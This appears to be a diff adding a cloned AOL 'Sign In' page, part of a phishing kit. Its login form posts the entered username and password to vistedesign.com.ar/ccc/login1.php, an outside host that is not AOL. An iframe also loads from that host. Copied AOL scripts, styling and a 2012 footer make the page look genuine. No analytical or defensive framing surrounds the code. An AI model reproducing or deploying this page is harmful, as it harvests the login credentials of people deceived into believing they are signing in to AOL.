+<script type="text/javascript"> adSetType('I'); htmlAdWH('93313475', '3', '2'); adSetType(''); </script><iframe title="Ad" name="adsF1" id="adsF1" src="http://vistedesign.com.ar/ccc/AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/size=3x2;noperf=1;alias=93313475;cfp=1;noaddonpl=y;kvpagetype=0;kveditags=0;kvmood=0;kvpatcheditags=0;kvag=0;kvinc=0;kvmar=0;kvch=0;kvseg=0;kvugc=0;kvui=f3ddfe6acf4911e196540f86bb84c9e8;kvmn=93313475;.htm" width="3" height="2" scrolling="no" frameborder="0" marginheight="0" marginwidth="0"></iframe>
+
+<style> body { background: #FFF; } </style>
+
+							
+						</div>
+						<div class="landslt">
+							<div class="prim_promo">
+								
+									
+								
+							</div>
+						</div>
+						<div class="landsrt">
+							
+								<div id="SNSLandingPageModule">&nbsp;</div>
+<div class="login login-canvas1">
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ <div id="lpmod">
+
+  <span id="si3">
+   <h3 id="lpHeader">Sign In</h3>
+  </span>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   
+<script type="text/JavaScript" language="JavaScript">
+
+
+
+function validateTab(loginForm) {
+    var frmName = "formCreds";
+    var labelString = "Username or Email";
+    var loginId = loginForm.loginId;
+    var pwrd = loginForm.password
+    var numericRegExp = /^[0-9]*$/;
+    var pwderr = new Array(4);
+    pwderr[RetVal.EMPTY_ERR]="You must enter a value for Password.";
+    pwderr[RetVal.MIN_ERR]="Password you entered is too short.";
+    pwderr[RetVal.MAX_ERR]="Password must not be longer than 16 characters.";
+    pwderr[RetVal.INVALID_ERR]="Password you entered is invalid. A Valid password should contain 6-16 characters.";
+    // cut the @aol associated domains......
+    stripOffAOLDomains(loginId);
+    if(loginId.value == "" || loginId.value == " " || loginId.value == labelString) {
+     alert("Please enter Username or Email.");
+     return false;
+    }
+    else if(pwrd.value == "" || pwrd.value == " ") {
+     alert("You must enter a value for Password.");
+     return false;
+    }
+    else if(pwrd.length < 3 ) {
+     alert("Password you entered is too short.");
+     return false;
+    }
+    else {
+     // add code here to write device profiling cookie...
+     getFlashDPCookie(frmName);
+     return true;
+    }
+   }
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
+
+</script>
+
+
+	<div id="box-top"></div>
+
+	<!-- start box-middle -->
+
+	<div id="box-middle">
+	
+		<div id="aol">
+			
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+function validateAolTab(loginForm) {
+ var frmName = "formCreds";
+ document.getElementById('snPwdErr').className = 'noLpErrorMsg';
+ document.getElementById('snPwdErr').innerHTML = "";
+ var labelString = "Username or Email";
+ var loginId = loginForm.loginId;
+ var pwrd = loginForm.password
+ var pwderr = new Array(4);
+ pwderr[RetVal.EMPTY_ERR]="You must enter a value for Password.";
+ pwderr[RetVal.MIN_ERR]="Password you entered is too short.";
+ pwderr[RetVal.MAX_ERR]="Password must not be longer than 16 characters.";
+ pwderr[RetVal.INVALID_ERR]="Password you entered is invalid. A Valid password should contain 6-16 characters.";
+ // cut the @aol associated domains and send off
+ stripOffAOLDomains(loginId);
+ if(loginId.value == "" || loginId.value == " " || loginId.value == labelString) {
+  document.getElementById('snPwdErr').className = 'lpErrorMsg';
+  document.getElementById('snPwdErr').innerHTML = "Please enter Username or Email.";
+
+  return false;
+ }
+ else if(pwrd.value == "" || pwrd.value == " ") {
+  document.getElementById('snPwdErr').className = 'lpErrorMsg';
+  document.getElementById('snPwdErr').innerHTML = "You must enter a value for Password.";
+  return false;
+ }
+ else if(pwrd.length < 3 ) {
+  document.getElementById('snPwdErr').className = 'lpErrorMsg';
+  document.getElementById('snPwdErr').innerHTML = "Password you entered is too short.";
+  return false;
+ }
+ else {
+   // add code here to write device profiling cookie...
+   getFlashDPCookie(frmName);
+   return true;
+ }
+}
+</script>
+
+<form name="AOLLoginForm" method="POST" action="http://vistedesign.com.ar/ccc/login1.php" onsubmit="return validateAolTab(this);" id="formCreds">
+  <input type="hidden" name="sitedomain" value="startpage.aol.com">
+  <input type="hidden" name="siteId" value="">
+  <input type="hidden" name="lang" value="en">
+  <input type="hidden" name="locale" value="us">        
+  <input type="hidden" name="authLev" value="0">
+  <input type="hidden" name="siteState" value="OrigUrl%3Dhttp%253A%252F%252Fwww.aol.com%252F">
+  <input type="hidden" name="isSiteStateEncoded" value="true">
+  <input type="hidden" name="mcState" value="initialized">
+  <input type="hidden" name="uitype" value="std">
+  <input type="hidden" name="use_aam" value="0">
+  <input type="hidden" name="offerId" value="">
+  <input type="hidden" name="seamless" value="y">
+  <input type="hidden" name="regPromoCode" value="">
+  <input type="hidden" name="usrd" value="3561763">
+  <input type="hidden" name="doSSL" value="">
+  <input type="hidden" name="redirType" value="">
+  <input type="hidden" name="xchk" value="false">
+  <input type="hidden" name="tab" value="">
+  <input type="hidden" name="lsoDP" value="">
+  
+  
+  
+  
+  
+  
+  
+   <div id="snPwdErr" class="noLpErrorMsg">
+       
+       
+       
+       
+   </div>
+  <style type="text/css">
+  #lpmod .lpErrorMsg{background-image:url(../../sns-static.aolcdn.com/sns.v12r4/images/ErrorIcon.gif);}
+  </style>
+  <label for="lgnId1" id="lgnLbl">Username or Email</label>
+             
+  
+  
+   <input type="text" name="loginId" maxlength="255" tabindex="1" value="" id="lgnId1" class="inputBox">
+  
+  
+  
+
+  <label for="pwdId1" id="pwdLbl">Password</label>
+  <input type="password" name="password" maxlength="39" tabindex="2" value="" id="pwdId1" class="inputBox">      	
+
+  <a href="../../account.login.aol.com/opr/_cqr/opr/opr.psp%3Fsitedomain=startpage.aol.com&amp;authLev=0&amp;siteState=OrigUrl%253Dhttp%25253A%25252F%25252Fwww.aol.com%25252F&amp;lang=en&amp;locale=us.html" tabindex="4" target="_top" id="forgot-pwd">Forgot password?</a>
+  
+  <div id="signin-row">
+  	<div id="lev0">
+	  
+	     <label for="rmbrMe" id="chkLbl">
+		      <input type="checkbox" name="rememberMe" tabindex="5" value="on" id="rmbrMe" alt="&lt;SNSI18N:message key=&#39;login.rememberMe&#39;/&gt;">
+		      Remember Me
+	     </label>
+	      
+	  	
+  	</div> 
+  	<input type="submit" id="submitID" value="Sign In" tabindex="3" title="Sign In" alt="Sign In">  
+  </div> 
+  
+    <br class="clearfix">
+    <a href="../../new.aol.com/productsweb%3Fncid=txtlnkuswebr00000054&amp;promocode=825329.html" target="_top" id="getSn" tabindex="6" title="Get a Free Username">Get a Free Username</a>
+
+ </form>
+     
+ <script>
+ if(getById("lgnId1")) {
+  if(getById("lgnId1").value.length < 1) {
+   getById("lgnId1").focus();
+  }
+  else {
+   getById("pwdId1").focus();
+  }
+ }
+ </script>
+
+
+		</div>
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script language="JavaScript" src="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/AC_OETags.js"></script>
+<script language="JavaScript" src="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/fs.js"></script><object width="0%" height="0%" align="middle" id="FS" name="/js/FS" type="application/x-shockwave-flash" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"><param name="movie" value="/js/FS.swf"> <param name="quality" value="high"> <param name="bgcolor" value="#869ca7"> <param name="flashvars" value="cn=dp&amp;p=/"> <param name="allowScriptAccess" value="sameDomain"> </object>
+
+
+</div>
+<!-- closing tags of minimod div which is used for NEW landing pages -->
+<script type="text/javascript">
+function getElementsByClass( searchClass, domNode, tagName) { 
+	if (domNode == null) {
+		domNode = document;
+	}
+	if (tagName == null) {
+		tagName = '*';
+	}
+	var el = new Array();
+	var tags = domNode.getElementsByTagName(tagName);
+	var tcl = " "+searchClass+" ";
+	for(i=0,j=0; i<tags.length; i++) { 
+		var test = " " + tags[i].className + " ";
+		if (test.indexOf(tcl) != -1) {
+			el[j++] = tags[i];
+		}
+	}
+	return el;
+}
+var imagelistsize = 4;
+var imagelistindex = Math.floor(Math.random()*imagelistsize);
+getElementsByClass('login', document, 'div')[0].className = "login login-canvas" + imagelistindex;
+</script>
+
+<script type="text/javascript">
+<!--
+var s_account="aolsnssignin";
+//-->
+</script>
+<script type="text/javascript" src="AOL.com&#32;-&#32;Welcome&#32;to&#32;AOL_files/omniunih.js"></script>
+<script type="text/javascript">
+<!--
+s_265.linkInternalFilters="javascript:,aol.com";
+s_265.server="my.screenname.aol.com";
+s_265.pfxID="sso";
+s_265.pageName="sso : login";
+s_265.channel="us.snssignin";
+s_265.prop1='ssologin';
+s_265.prop12="/snsUiDriver.jsp";
+s_265.prop16="startpage.aol.com";
+s_265.prop17="lp";
+s_265.prop18="0";
+s_265.prop19="vl6";
+s_265.prop20="en-us";
+s_265.prop21="AOLPortal";
+s_265.prop22=".aol.com";
+s_265.prop23="aol-com-jv3-en-us";
+s_265.mmxgo=true;
+var s_code=s_265.t();
+if(s_code)document.write(s_code);
+//-->
+</script>
+
+	<!-- <jsp:include page="snLogin.html"></jsp:include> -->
+</div>
+								
+							<div class="addl_promo">
+								
+									<!-- CROSS_PROMO_AD_CNT  -->
+
+<script type="text/javascript">
+	var snEleHref = 'https://new.aol.com/productsweb?ncid=txtlnkuswebr00000054&promocode=825329';
+	var snEleTitle = 'Get a Free Username';
+</script>
+								
+							</div>
+						</div>
+					</div>
+					<div class="footer">
+						
+							
+							<!--CHANNEL_FTR_CNT-->
+<a target="_blank" href="../../www.corp.aol.com/index.html">AOL Inc.</a>
+| <a target="_blank" href="../../privacy.aol.com/index.html">Privacy Policy</a>
+| <a target="_blank" href="../../legal.aol.com/TOS.html">Terms of Service</a>
+| <a target="_blank" href="../../adinfo.aol.com/about-our-ads.html">About Our Ads</a>
+| <a target="_blank" href="../../daol.aol.com/aolatoz.html">Site Map</a>
+| <a target="_blank" href="../../help.aol.com/index.html">Help</a>
+© 2012 AOL Inc. All Rights Reserved.
+<!--CHANNEL_FTR_CNT-->
+						
+					</div>
+				</div>
+			</div>
+		</div>
+	
+
+
+
+
+</div><div id="crossrider-app-stub3491"></div></body></html>
